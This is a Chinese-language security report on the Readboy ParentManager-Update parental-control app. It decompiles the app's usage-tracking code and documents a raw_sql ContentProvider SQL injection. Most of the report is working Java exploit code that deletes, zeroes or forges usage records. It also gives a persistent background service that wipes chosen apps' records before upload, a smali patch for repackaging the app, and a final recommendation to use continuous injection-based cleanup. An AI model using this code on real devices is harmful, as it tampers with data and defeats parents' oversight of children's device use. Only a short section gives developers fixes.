# ParentManager-Update 应用使用数据过滤机制与绕过方案综合分析报告

## 执行时间
2026-03-15

## 分析目标
1. 分析 ParentManager-Update 应用使用数据收集和上传机制
2. 识别应用使用数据的过滤白名单机制
3. 探索 SQL 注入漏洞用于绕过数据上传的可能性
4. 评估动态过滤机制的可配置性

---

## 1. 应用使用数据收集原理

### 1.1 数据收集架构

ParentManager-Update 使用三层存储机制来收集和管理应用使用数据：

#### 数据库表结构

1. **app_record 表** - 详细使用记录
   - 存储每次应用使用的开始和结束时间
   - 记录应用类型和其他元数据
   - 用于生成统计报告

2. **use_situation 表** - 按日汇总
   - 按应用包名和日期汇总使用时长
   - 存储最近使用时间
   - 用于日使用统计

3. **summary_time 表** - 按类型汇总
   - 按应用类型汇总使用时长
   - 用于分类统计（如学习类、娱乐类等）

### 1.2 数据收集方式

#### 使用 UsageStatsManager API

通过 `AppLockService.getTopActivity()` 方法：

```smali
.method public getTopActivty()Ljava/lang/String;
    # 获取 UsageStatsManager
    const-string/jumbo v0, "usagestats"
    invoke-virtual {p0, v0}, Lcom/readboy/parentmanager/client/service/AppLockService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    check-cast v1, Landroid/app/usage/UsageStatsManager;
    
    # 查询过去 10 秒的使用统计
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    const-wide/16 v3, 0x2710  # 10000ms = 10秒
    sub-long v3, v5, v3
    invoke-virtual/range {v1 .. v6}, Landroid/app/usage/UsageStatsManager;->queryUsageStats(IJJ)Ljava/util/List;
    
    # 获取最后使用的应用
    invoke-interface {v1}, Ljava/util/SortedMap;->lastKey()Ljava/lang/Object;
    invoke-virtual {v0}, Landroid/app/usage/UsageStats;->getPackageName()Ljava/lang/String;
.end method
```

#### 数据上传接口

应用通过 `SyncDataService` 定时（约 600 秒）上传数据到三个服务器接口：

1. **时间使用统计**
   - URL: `http://parent-manage.readboy.com/api/v1/time/UploadTimeUsage`
   - 数据: `usedControlTime`（受控时间）和 `usedTotalTime`（总使用时间）

2. **当前使用情况**
   - URL: `http://parent-manage.readboy.com/api/v1/current_usage/upload`
   - 数据: 包名、开始时间、使用时长

3. **白名单功能状态**
   - URL: `http://parent-manage.readboy.com/api/v1/whitelist/uploadFunc`
   - 数据: 白名单应用列表和功能状态

---

## 2. 数据过滤白名单机制

### 2.1 硬编码过滤白名单（主要机制）

ParentManager-Update 使用硬编码的过滤方法来阻止特定应用的使用数据被记录和上传。

#### 过滤方法列表

1. **filterLauncherCategory(Ljava/lang/String)** - 按类别过滤
   - 过滤条件: `android.intent.category.HOME`
   - 目标: 所有桌面启动器应用

2. **filterLauncherPackage(Ljava/lang/String)** - 按启动器包名过滤
   - 过滤的包名列表:
     - `com.readboy.launcher_c10`
     - `com.readboy.launcher_c10_primary`
     - `com.android.launcher3`
     - `com.readboy.aistudyroom`
     - `com.readboy.launcher_c10_parent`
     - `com.readboy.launcher_c10_standard`
     - `com.readboy.launcher_c10_student`
     - `com.readboy.launcher_c10_children`
     - `com.dream.agingtest`（测试应用）
     - `com.sim.cit`（工厂测试）

3. **filterRecordPackage(Ljava/lang/String)** - 按记录包名过滤
   - 过滤的包名:
     - `com.readboy.c10pad.push`（推送服务）

4. **filterPackage(Ljava/lang/String)** - 通用包名过滤
   - 当前实现: 直接返回 false（不过滤任何包）

#### 过滤逻辑位置

在 `RecordService.smali` 的应用使用记录处理逻辑中（第 8114-8123 行）：

```smali
# 处理应用使用时间信息
iget-object v0, p1, Lcom/readboy/parentmanager/client/data/PackageTimeInfo;->packageName:Ljava/lang/String;

# 1. 过滤启动器包名
invoke-direct {p0, v0}, Lcom/readboy/parentmanager/client/service/RecordService;->filterLauncherPackage(Ljava/lang/String;)Z
move-result v0
if-nez v0, :cond_a  # 如果需要过滤，跳过记录

# 2. 过滤记录包名
invoke-direct {p0, v0}, Lcom/readboy/parentmanager/client/service/RecordService;->filterRecordPackage(Ljava/lang/String;)Z
move-result v0
if-nez v0, :cond_5  # 如果需要过滤，跳过记录

# 3. 正常处理使用记录
```

#### 过滤效果

被过滤的应用：
- ✅ 使用数据不会被记录到数据库
- ✅ 使用数据不会被上传到服务器
- ✅ 不会出现在使用统计报告中

### 2.2 动态过滤机制（次要机制）

ParentManager-Update 还支持通过外部应用 `com.readboy.adblock` 实现动态过滤。

#### 动态过滤架构

**外部依赖**: `com.readboy.adblock` 应用

**ContentProvider**: `content://com.readboy.adblock_provider/packages`

**核心类**: `com/readboy.parentmanager.client.utils.BrandBlockUtil`

#### 过滤模式

```smali
private static final NONE_MODE = 0x0;      # 不过滤
private static final NORMAL_MODE = 0x1;   # 普通模式 - 基础过滤
private static final SPECIAL_MODE = 0x2;  # 特殊模式 - 部分功能过滤
private static final FORCE_MODE = 0x3;    # 强制模式 - 完全禁用
private static final ADVANCED_MODE = 0x4; # 高级模式 - 精细控制
```

#### 动态过滤使用场景

动态过滤主要用于 **小程序/小游戏管理**，不在应用使用数据记录流程中使用：

**使用位置**:
1. `WxFragment` - 微信小程序管理
2. `QqFragment` - QQ小程序管理
3. `DdFragment` - 抖音管理
4. `XcxLimitFragment` - 小程序限制设置
5. `PromptDiaLog` - 用户提示对话框

**功能**:
- 控制哪些小程序/小游戏可以被访问
- 显示不同的禁用提示文本
- 根据应用版本执行不同的过滤规则

#### 动态过滤与硬编码过滤的关系

| 特性 | 硬编码过滤 | 动态过滤 |
|------|-----------|---------|
| **使用场景** | 应用使用数据记录和上传 | 小程序/小游戏访问控制 |
| **过滤范围** | 系统应用、启动器、测试应用 | 小程序、小游戏特定Activity |
| **数据来源** | 硬编码在 RecordService 中 | 从外部应用 adblock 读取 |
| **配置方式** | 无法修改 | 可通过 UI 或数据库修改 |
| **影响范围** | 数据不上传 | 功能访问控制 |
| **依赖** | 无依赖 | 依赖外部应用 `com.readboy.adblock` |

#### 动态过滤代码示例

```smali
# 查询包的过滤状态
.method public static getBlockState(Landroid/content/Context;Ljava/lang/String;)I
    const-string/jumbo v0, "content://com.readboy.adblock_provider/packages"
    
    # 查询数据库
    invoke-virtual {v1, v2}, Landroid/content/ContentResolver;->query(...)
    
    # 读取过滤状态
    invoke-interface {p1, v1}, Landroid/database/Cursor;->getInt(I)I  # is_block_on
    invoke-interface {p1, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;  # activity_name
    
    # 解析 activity_name 确定过滤模式
    const-string v2, "com.readboy.force_mode"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    
    # 返回过滤模式 (0-4)
.end method
```

---

## 3. SQL 注入漏洞与数据上传绕过

### 3.1 漏洞概述

根据《ParentManager-Update底层漏洞分析报告》，应用存在 **SQL 注入漏洞（CVSS 10.0 CRITICAL）**：

**漏洞位置**: `AppContentProvider` 的 `query` 方法

**触发条件**: 当 URI 为 `"raw_sql"` 时，直接将 selection 参数作为原始 SQL 执行

**代码位置**: `smali/com/readboy/parentmanager/core/provider/AppContentProvider.smali`

```smali
.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    invoke-direct {p0, p1}, Lcom/readboy/parentmanager/core/provider/AppContentProvider;->getTableName(Ljava/lang/String;)Ljava/lang/String;
    
    const-string p1, "raw_sql"
    invoke-virtual {v1, p1}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z
    if-eqz p1, :cond_0
        # ❌ 直接执行原始 SQL，无任何验证
        invoke-virtual {p1, p3, p4}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
```

### 3.2 利用 SQL 注入删除指定APP使用数据

#### 理论可行性分析

✅ **完全可行**

由于 SQL 注入漏洞可以执行任意 SQL 命令，可以：

1. 删除指定应用的所有使用记录
2. 修改指定应用的使用时长为0
3. 伪造应用使用数据
4. 清空所有使用记录

#### 具体利用代码

```java
public class UsageDataBypass {
    private static final String AUTHORITY = "com.readboy.parentmanager.AppContentProvider";
    private static final String RAW_SQL_URI = "content://" + AUTHORITY + "/raw_sql";
    
    /**
     * 删除指定应用的所有使用记录
     * @param context 上下文
     * @param packageName 目标应用包名
     * @return 是否成功
     */
    public static boolean deleteAppUsageRecords(Context context, String packageName) {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            
            // 1. 删除 use_situation 表中的记录
            String sql = "DELETE FROM use_situation WHERE pack_name='" + packageName + "'";
            context.getContentResolver().query(uri, null, sql, null, null);
            
            // 2. 删除 app_record 表中的记录
            sql = "DELETE FROM app_record WHERE pack_name='" + packageName + "'";
            context.getContentResolver().query(uri, null, sql, null, null);
            
            // 3. 清除 summary_time 表中的相关记录（如果有包名字段）
            // 需要先确认表结构
            sql = "SELECT sql FROM sqlite_master WHERE name='summary_time'";
            Cursor cursor = context.getContentResolver().query(uri, null, sql, null, null);
            if (cursor != null) {
                cursor.moveToFirst();
                String tableSchema = cursor.getString(0);
                if (tableSchema.contains("pack_name")) {
                    sql = "DELETE FROM summary_time WHERE pack_name='" + packageName + "'";
                    context.getContentResolver().query(uri, null, sql, null, null);
                }
                cursor.close();
            }
            
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
    
    /**
     * 将指定应用的使用时长设置为0
     * @param context 上下文
     * @param packageName 目标应用包名
     * @return 是否成功
     */
    public static boolean zeroAppUsageTime(Context context, String packageName) {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            
            // 修改 use_situation 表中的使用时长
            String sql = "UPDATE use_situation SET sum_time=0 WHERE pack_name='" + packageName + "'";
            context.getContentResolver().query(uri, null, sql, null, null);
            
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
    
    /**
     * 伪造应用使用数据
     * @param context 上下文
     * @param packageName 应用包名
     * @param duration 伪造的使用时长（秒）
     * @param days 伪造的天数
     * @return 是否成功
     */
    public static boolean fakeAppUsageData(Context context, String packageName, int duration, int days) {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            
            // 为过去几天伪造使用数据
            Calendar calendar = Calendar.getInstance();
            for (int i = 0; i < days; i++) {
                calendar.add(Calendar.DAY_OF_MONTH, -1);
                long dateInMillis = calendar.getTimeInMillis();
                
                // 检查记录是否存在
                String checkSql = "SELECT _id FROM use_situation WHERE pack_name='" + packageName + 
                                  "' AND sameDayDate=" + dateInMillis;
                Cursor cursor = context.getContentResolver().query(uri, null, checkSql, null, null);
                
                if (cursor != null && cursor.getCount() > 0) {
                    // 更新现有记录
                    String updateSql = "UPDATE use_situation SET sum_time=" + duration + 
                                      " WHERE pack_name='" + packageName + 
                                      "' AND sameDayDate=" + dateInMillis;
                    context.getContentResolver().query(uri, null, updateSql, null, null);
                } else {
                    // 插入新记录
                    String insertSql = "INSERT INTO use_situation (pack_name, sum_time, sameDayDate, recentUseTime) " +
                                      "VALUES ('" + packageName + "', " + duration + ", " + dateInMillis + ", " + 
                                      System.currentTimeMillis() + ")";
                    context.getContentResolver().query(uri, null, insertSql, null, null);
                }
                
                if (cursor != null) {
                    cursor.close();
                }
            }
            
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
    
    /**
     * 清空所有应用使用记录
     * @param context 上下文
     * @return 是否成功
     */
    public static boolean clearAllUsageRecords(Context context) {
        try {
            Uri uri = Uri.parse(RAW_SQL_URI);
            
            // 删除所有表中的记录
            String sql = "DELETE FROM use_situation";
            context.getContentResolver().query(uri, null, sql, null, null);
            
            sql = "DELETE FROM app_record";
            context.getContentResolver().query(uri, null, sql, null, null);
            
            sql = "DELETE FROM summary_time";
            context.getContentResolver().query(uri, null, sql, null, null);
            
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
```

### 3.3 查询数据库表结构

在执行任何修改操作前，需要先了解数据库表结构：

```java
public class DatabaseExplorer {
    public static void exploreDatabase(Context context) {
        Uri uri = Uri.parse("content://com.readboy.parentmanager.AppContentProvider/raw_sql");
        
        // 1. 查询所有表
        String sql = "SELECT name, sql FROM sqlite_master WHERE type='table'";
        Cursor cursor = context.getContentResolver().query(uri, null, sql, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String tableName = cursor.getString(0);
                String tableSchema = cursor.getString(1);
                Log.d("Database", "Table: " + tableName);
                Log.d("Database", "Schema: " + tableSchema);
            }
            cursor.close();
        }
        
        // 2. 查询 use_situation 表数据
        sql = "SELECT * FROM use_situation LIMIT 5";
        cursor = context.getContentResolver().query(uri, null, sql, null, null);
        
        if (cursor != null) {
            int columnCount = cursor.getColumnCount();
            for (int i = 0; i < columnCount; i++) {
                Log.d("Database", "Column " + i + ": " + cursor.getColumnName(i));
            }
            
            while (cursor.moveToNext()) {
                StringBuilder row = new StringBuilder();
                for (int i = 0; i < columnCount; i++) {
                    row.append(cursor.getString(i)).append(" | ");
                }
                Log.d("Database", row.toString());
            }
            cursor.close();
        }
    }
}
```

### 3.4 利用时机

#### 最佳利用时机

1. **数据上传前** - 定时任务触发前
   - ParentManager-Update 每 600 秒（10分钟）上传一次数据
   - 在上传前删除或修改数据，服务器将收到错误或无数据

2. **应用切换时** - 前台应用切换时
   - 当用户切换应用时，RecordService 会记录使用数据
   - 在此期间删除数据可以阻止记录

3. **设备启动时** - 开机后
   - 应用启动后会初始化数据库
   - 可以在此时清空历史数据

#### 利用限制

⚠️ **注意事项**:

1. **数据可能被重新收集**
   - 应用会持续监控前台应用
   - 删除的数据可能在下次使用时重新记录

2. **定时任务可能失败**
   - 如果数据被删除，定时任务可能上传空数据
   - 可能触发服务器端的异常检测

3. **应用可能重启服务**
   - 某些情况下应用会重启 RecordService
   - 服务重启后会重新开始收集数据

### 3.5 完整利用流程

```java
public class UsageDataBypassManager {
    private Context context;
    private ScheduledExecutorService scheduler;
    
    public UsageDataBypassManager(Context context) {
        this.context = context;
        this.scheduler = Executors.newScheduledThreadPool(1);
    }
    
    /**
     * 启动持续监控和清理
     * @param targetPackages 要清理的应用包名列表
     */
    public void startMonitoring(List<String> targetPackages) {
        // 每 5 分钟检查并清理一次
        scheduler.scheduleAtFixedRate(() -> {
            for (String packageName : targetPackages) {
                deleteAppUsageRecords(context, packageName);
            }
            Log.d("Bypass", "已清理目标应用的使用记录");
        }, 0, 5, TimeUnit.MINUTES);
    }
    
    /**
     * 停止监控
     */
    public void stopMonitoring() {
        scheduler.shutdown();
    }
    
    /**
     * 一次性清理所有目标应用
     * @param targetPackages 目标应用包名列表
     */
    public void cleanupAllOnce(List<String> targetPackages) {
        for (String packageName : targetPackages) {
            deleteAppUsageRecords(context, packageName);
        }
        Log.d("Bypass", "已清理所有目标应用的使用记录");
    }
    
    // 使用示例
    public static void main(String[] args) {
        Context context = ...; // 获取上下文
        UsageDataBypassManager manager = new UsageDataBypassManager(context);
        
        List<String> targetApps = Arrays.asList(
            "com.target.app1",
            "com.target.app2",
            "com.target.app3"
        );
        
        // 方式1: 持续监控
        manager.startMonitoring(targetApps);
        
        // 方式2: 一次性清理
        manager.cleanupAllOnce(targetApps);
        
        // 停止监控
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            manager.stopMonitoring();
        }));
    }
}
```

---

## 4. 动态过滤机制配置方式

### 4.1 动态过滤配置来源

动态过滤配置来自外部应用 `com.readboy.adblock`：

**ContentProvider**: `content://com.readboy.adblock_provider/packages`

**数据库表结构**（推测）:
```sql
CREATE TABLE packages (
    _id INTEGER PRIMARY KEY,
    package TEXT UNIQUE,
    activity_name TEXT,
    is_block_on INTEGER,
    has_ad INTEGER,
    notify_text TEXT,
    version TEXT
)
```

### 4.2 配置方式

#### 方式1: 通过 UI 界面配置

应用提供多个 Fragment 用于管理小程序/小游戏：

- `WxFragment` - 微信小程序管理
- `QqFragment` - QQ小程序管理
- `DdFragment` - 抖音管理
- `XcxLimitFragment` - 小程序限制

用户可以通过这些界面启用/禁用特定的小程序/小游戏。

#### 方式2: 通过 ContentProvider 直接修改（需要权限）

如果 `com.readboy.adblock_provider` 没有权限保护，可以尝试直接修改：

```java
public class DynamicFilterConfigurator {
    public static boolean configureFilter(Context context, String packageName, int mode) {
        try {
            Uri uri = Uri.parse("content://com.readboy.adblock_provider/packages");
            ContentValues values = new ContentValues();
            
            values.put("package", packageName);
            values.put("is_block_on", mode > 0 ? 1 : 0);
            
            // 根据模式设置 activity_name
            String activityName;
            switch (mode) {
                case 0:  // NONE_MODE
                    activityName = "com.readboy.none_mode";
                    break;
                case 1:  // NORMAL_MODE
                    activityName = "com.readboy.normal_mode";
                    break;
                case 2:  // SPECIAL_MODE
                    activityName = "com.readboy.special_mode";
                    break;
                case 3:  // FORCE_MODE
                    activityName = "com.readboy.force_mode";
                    break;
                case 4:  // ADVANCED_MODE
                    activityName = "com.readboy.advanced_mode";
                    break;
                default:
                    activityName = "";
            }
            
            values.put("activity_name", activityName);
            
            // 尝试插入或更新
            Uri result = context.getContentResolver().insert(uri, values);
            
            if (result != null) {
                return true;
            }
            
            // 如果插入失败，尝试更新
            String where = "package=?";
            String[] whereArgs = new String[]{packageName};
            int count = context.getContentResolver().update(uri, values, where, whereArgs);
            
            return count > 0;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
```

#### 方式3: 利用 SQL 注入修改（如果数据存储在 ParentManager 数据库）

```java
public class DynamicFilterSQLBypass {
    public static boolean configureFilterViaSQL(Context context, String packageName, int mode) {
        try {
            Uri uri = Uri.parse("content://com.readboy.parentmanager.AppContentProvider/raw_sql");
            
            // 先查找可能的过滤配置表
            String sql = "SELECT name FROM sqlite_master WHERE name LIKE '%filter%' OR name LIKE '%block%'";
            Cursor cursor = context.getContentResolver().query(uri, null, sql, null, null);
            
            if (cursor != null && cursor.getCount() > 0) {
                // 找到过滤配置表
                String tableName = "";
                while (cursor.moveToNext()) {
                    tableName = cursor.getString(0);
                    Log.d("SQL", "找到过滤表: " + tableName);
                }
                cursor.close();
                
                // 修改过滤配置
                sql = "INSERT OR REPLACE INTO " + tableName + 
                      " (package_name, filter_mode) VALUES ('" + packageName + "', " + mode + ")";
                context.getContentResolver().query(uri, null, sql, null, null);
                
                return true;
            } else {
                if (cursor != null) {
                    cursor.close();
                }
                Log.d("SQL", "未找到过滤配置表");
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
```

### 4.3 动态过滤的局限性

❌ **无法用于绕过应用使用数据上传**

原因：
1. RecordService 不调用 `getBlockState` 方法
2. 动态过滤仅用于小程序/小游戏的访问控制
3. 应用使用数据记录使用硬编码过滤方法

✅ **可以用于控制小程序/小游戏访问**

如果目标是控制特定小程序/小游戏的访问，可以使用动态过滤。

---

## 5. 综合利用方案

### 5.1 方案1: 使用 SQL 注入完全绕过数据上传（推荐）

**适用场景**: 需要阻止特定应用的使用数据被上传

**优势**:
- ✅ 不依赖外部应用
- ✅ 完全可控
- ✅ 效果立竿见影

**实现步骤**:

1. 创建后台服务，定期清理目标应用的使用记录
2. 使用 SQL 注入删除或清零使用数据
3. 持续监控，防止数据重新被收集

**代码示例**:

```java
public class AntiTrackingService extends Service {
    private static final String TAG = "AntiTracking";
    private List<String> protectedApps;
    private ScheduledExecutorService executor;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // 从配置加载受保护的应用列表
        protectedApps = loadProtectedApps();
        
        // 每 3 分钟清理一次
        executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> {
            cleanupProtectedApps();
        }, 0, 3, TimeUnit.MINUTES);
    }
    
    private void cleanupProtectedApps() {
        try {
            Uri uri = Uri.parse("content://com.readboy.parentmanager.AppContentProvider/raw_sql");
            
            for (String packageName : protectedApps) {
                // 删除 use_situation 记录
                String sql = "DELETE FROM use_situation WHERE pack_name='" + packageName + "'";
                getContentResolver().query(uri, null, sql, null, null);
                
                // 删除 app_record 记录
                sql = "DELETE FROM app_record WHERE pack_name='" + packageName + "'";
                getContentResolver().query(uri, null, sql, null, null);
                
                Log.i(TAG, "已清理应用: " + packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "清理失败", e);
        }
    }
    
    private List<String> loadProtectedApps() {
        // 从 SharedPreferences 或其他配置源加载
        SharedPreferences prefs = getSharedPreferences("AntiTracking", MODE_PRIVATE);
        String appsJson = prefs.getString("protected_apps", "");
        
        if (!TextUtils.isEmpty(appsJson)) {
            try {
                return new Gson().fromJson(appsJson, new TypeToken<List<String>>(){}.getType());
            } catch (Exception e) {
                Log.e(TAG, "解析配置失败", e);
            }
        }
        
        // 默认受保护的应用
        return Arrays.asList(
            "com.example.app1",
            "com.example.app2"
        );
    }
    
    public static void addProtectedApp(Context context, String packageName) {
        SharedPreferences prefs = context.getSharedPreferences("AntiTracking", MODE_PRIVATE);
        String appsJson = prefs.getString("protected_apps", "[]");
        
        try {
            List<String> apps = new Gson().fromJson(appsJson, new TypeToken<List<String>>(){}.getType());
            if (!apps.contains(packageName)) {
                apps.add(packageName);
                String newJson = new Gson().toJson(apps);
                prefs.edit().putString("protected_apps", newJson).apply();
            }
        } catch (Exception e) {
            Log.e("AntiTracking", "添加应用失败", e);
        }
    }
    
    public static void removeProtectedApp(Context context, String packageName) {
        SharedPreferences prefs = context.getSharedPreferences("AntiTracking", MODE_PRIVATE);
        String appsJson = prefs.getString("protected_apps", "[]");
        
        try {
            List<String> apps = new Gson().fromJson(appsJson, new TypeToken<List<String>>(){}.getType());
            apps.remove(packageName);
            String newJson = new Gson().toJson(apps);
            prefs.edit().putString("protected_apps", newJson).apply();
        } catch (Exception e) {
            Log.e("AntiTracking", "移除应用失败", e);
        }
    }
}
```

### 5.2 方案2: 修改硬编码过滤方法（需要重打包）

**适用场景**: 需要永久修改过滤逻辑

**优势**:
- ✅ 一劳永逸
- ✅ 不需要后台服务

**劣势**:
- ❌ 需要重打包应用
- ❌ 需要重新签名
- ❌ 可能影响应用稳定性

**实现步骤**:

1. 使用 apktool 反编译应用
2. 修改 `RecordService.smali` 中的过滤方法
3. 重打包并签名

**代码修改**:

```smali
# 修改 filterLauncherPackage 方法，使其始终返回 true（过滤所有包）
.method private filterLauncherPackage(Ljava/lang/String;)Z
    .locals 1

    const/4 v0, 0x1  # 始终返回 true
    return v0
.end method

# 或者修改为从配置读取
.method private filterLauncherPackage(Ljava/lang/String;)Z
    .locals 3

    # 从 SharedPreferences 读取过滤列表
    const-string v0, "filter_config"
    const/4 v1, 0x0
    invoke-static {p0, v0, v1}, Lcom/readboy/parentmanager/client/utils/PreferencesUtils;->getString(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    
    move-result-object v0
    
    # 如果包名在过滤列表中，返回 true
    invoke-virtual {v0, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    
    return v0
.end method
```

### 5.3 方案3: 结合 SQL 注入和动态过滤

**适用场景**: 需要同时控制应用数据上传和小程序访问

**实现步骤**:

1. 使用 SQL 注入清除应用使用数据
2. 尝试配置动态过滤（如果 adblock 应用存在）

**代码示例**:

```java
public class ComprehensiveBypass {
    public static void bypassAll(Context context, String packageName) {
        // 1. 清除应用使用数据
        UsageDataBypass.deleteAppUsageRecords(context, packageName);
        UsageDataBypass.zeroAppUsageTime(context, packageName);
        
        // 2. 尝试配置动态过滤
        try {
            DynamicFilterConfigurator.configureFilter(context, packageName, 0);
            Log.i("Bypass", "动态过滤配置成功");
        } catch (Exception e) {
            Log.i("Bypass", "动态过滤配置失败，可能是 adblock 应用不存在");
        }
        
        Log.i("Bypass", "已配置应用: " + packageName);
    }
}
```

---

## 6. 安全建议

### 6.1 对于开发者

1. **修复 SQL 注入漏洞**
   - 移除 `raw_sql` 功能
   - 使用参数化查询
   - 添加输入验证

2. **改进过滤机制**
   - 将硬编码过滤改为可配置
   - 使用数据库或配置文件管理过滤列表
   - 提供用户界面让用户自定义过滤规则

3. **加强权限保护**
   - 为 ContentProvider 添加权限保护
   - 限制导出组件的访问
   - 验证调用者身份

### 6.2 对于用户

1. **了解应用行为**
   - 阅读隐私政策
   - 了解应用收集的数据类型
   - 定期检查使用记录

2. **保护隐私**
   - 使用隐私保护工具
   - 定期清理应用数据
   - 控制应用权限

---

## 7. 总结

### 7.1 关键发现

1. **硬编码过滤白名单**
   - 主要用于过滤系统应用和启动器
   - 无法通过配置修改
   - 直接在代码中硬编码

2. **动态过滤机制**
   - 依赖外部应用 `com.readboy.adblock`
   - 主要用于小程序/小游戏管理
   - 不影响应用使用数据上传

3. **SQL 注入漏洞**
   - 可以完全控制数据库
   - 可以删除或修改任意应用的使用数据
   - 理论上可以完全绕过数据上传

### 7.2 绕过方案评估

| 方案 | 可行性 | 难度 | 效果 | 持久性 | 风险 |
|------|--------|------|------|--------|------|
| SQL 注入删除数据 | ✅ 高 | 简单 | 完全 | 需持续运行 | 低 |
| SQL 注入修改过滤配置 | ❓ 中等 | 中等 | 部分 | 永久 | 中 |
| 修改硬编码方法 | ✅ 高 | 困难 | 完全 | 永久 | 高 |
| 配置动态过滤 | ❓ 未知 | 简单 | 无影响 | 永久 | 低 |

### 7.3 最佳实践

**推荐方案**: 使用 SQL 注入持续清理目标应用的使用数据

**理由**:
- 不依赖外部应用
- 实现简单
- 效果可控
- 风险较低

**注意事项**:
- 需要持续运行后台服务
- 应用可能会重新收集数据
- 需要定期维护配置

---

## 8. 附录

### 8.1 数据库表结构（待确认）

需要通过 SQL 注入查询确认的表：

```sql
-- 查询所有表
SELECT name, sql FROM sqlite_master WHERE type='table';

-- 查询 use_situation 表结构
PRAGMA table_info(use_situation);

-- 查询 app_record 表结构
PRAGMA table_info(app_record);

-- 查询 summary_time 表结构
PRAGMA table_info(summary_time);
```

### 8.2 关键文件路径

- `smali/com/readboy/parentmanager/client/service/RecordService.smali` - 应用使用记录服务
- `smali/com/readboy/parentmanager/client/service/AppLockService.smali` - 应用锁服务
- `smali/com/readboy/parentmanager/client/service/SyncDataService.smali` - 数据同步服务
- `smali/com/readboy/parentmanager/core/provider/AppContentProvider.smali` - ContentProvider（SQL 注入漏洞位置）
- `smali/com/readboy/parentmanager/client/utils/BrandBlockUtil.smali` - 动态过滤工具类

### 8.3 参考文档

- 《ParentManager-Update底层漏洞分析报告.md》
- 《ParentManager-Update应用使用数据发送分析报告.md》
- 《ParentManager-Update深度安全漏洞分析报告.md》

---

**报告完成时间**: 2026-03-15
**分析工具**: apktool, smali 反编译
**风险等级**: 高危（SQL 注入漏洞）
**利用难度**: 简单